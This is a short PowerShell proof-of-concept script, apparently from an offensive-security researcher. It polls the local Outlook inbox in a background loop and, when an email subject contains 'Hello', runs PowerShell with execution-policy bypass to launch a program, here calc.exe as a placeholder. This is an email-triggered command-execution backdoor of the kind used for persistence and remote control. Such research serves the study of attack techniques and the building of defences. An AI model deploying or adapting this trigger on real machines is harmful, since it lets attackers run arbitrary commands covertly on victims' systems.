<# Matt Nelson
@enigma0x3
www.enigma0x3.wordpress.com
#>

$job = Start-Job -Name "Job1" -ScriptBlock {Do {
$olFolderInbox = 6
$outlook = new-object -com outlook.application;
$ns = $outlook.GetNameSpace("MAPI");
$inbox = $ns.GetDefaultFolder($olFolderInbox)
$inbox.items | foreach {
        if($_.subject -match "Hello") {Powershell.exe -ep Bypass -noexit Invoke-Item C:\Windows\System32\calc.exe }
      
}} Until ($False)}
Start-Sleep -s 10
Stop-Job $job
